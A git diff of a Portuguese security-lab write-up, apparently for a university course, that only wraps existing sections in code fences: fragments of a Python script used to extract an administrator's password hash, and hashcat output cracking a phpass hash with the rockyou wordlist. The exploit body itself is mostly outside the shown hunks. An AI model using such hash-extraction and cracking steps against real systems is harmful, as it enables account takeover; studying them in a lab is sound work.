@@ -203,6 +203,8 @@ rodri@DESKTOP-2VSGICH:\~/fsi/sqlmap-dev$
 
 ### Código usado para realizar o exploit
 
+```
+
 `import requests`  
 `import string`  
 `from sys import exit`
@@ -274,7 +276,11 @@ rodri@DESKTOP-2VSGICH:\~/fsi/sqlmap-dev$
                 `print("Password hash:", admin_password_hash)`  
                 `exit(0)`
 
+```
+
 ### Resultado do hashcat completo
+
+```
 
 PS C:\\Users\\rodri\\Downloads\\hashcat-6.2.6\\hashcat-6.2.6\> hashcat.exe \-m 400 \-a 0 hash.txt rockyou.txt  
 hashcat.exe : The term 'hashcat.exe' is not recognized as the name of a cmdlet, function, script file, or operable  
@@ -378,3 +384,4 @@ Started: Fri Dec 06 21:49:20 2024
 Stopped: Fri Dec 06 21:50:03 2024  
 PS C:\\Users\\rodri\\Downloads\\hashcat-6.2.6\\hashcat-6.2.6\>
 
+```
